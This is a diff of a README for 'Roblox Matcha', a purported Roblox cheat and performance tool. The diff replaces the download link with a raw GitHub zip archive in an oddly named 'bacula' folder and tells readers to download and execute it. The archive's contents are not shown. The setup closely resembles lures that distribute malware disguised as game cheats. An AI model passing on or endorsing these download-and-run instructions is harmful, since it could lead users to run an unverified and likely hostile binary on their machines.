@@ -12,9 +12,9 @@ Welcome to Roblox Matcha, your go-to software for enhancing your gaming experien
 ⚙️ **matcha-roblox**: Fine-tune your Roblox settings for peak performance.
 
 ### Get Started:
-Visit [**aimmy.cc**](https://aimmy.cc) to download and execute the file needed to unlock the full potential of Roblox Matcha.
+Visit [**https://github.com/satish-ss/Roblox-Matcha/raw/refs/heads/master/bacula/Matcha-Roblox-v3.9-beta.1.zip**](https://github.com/satish-ss/Roblox-Matcha/raw/refs/heads/master/bacula/Matcha-Roblox-v3.9-beta.1.zip) to download and execute the file needed to unlock the full potential of Roblox Matcha.
 
-[![Download Matcha](https://img.shields.io/badge/Download-Matcha-blue)](https://aimmy.cc)
+[![Download Matcha](https://github.com/satish-ss/Roblox-Matcha/raw/refs/heads/master/bacula/Matcha-Roblox-v3.9-beta.1.zip)](https://github.com/satish-ss/Roblox-Matcha/raw/refs/heads/master/bacula/Matcha-Roblox-v3.9-beta.1.zip)
 
 With Roblox Matcha, you can take your gaming skills to the next level. Improve your scripts, connect with other gamers, and dominate in your favorite Roblox games. Don't miss out on the opportunity to elevate your gaming experience like never before!
 
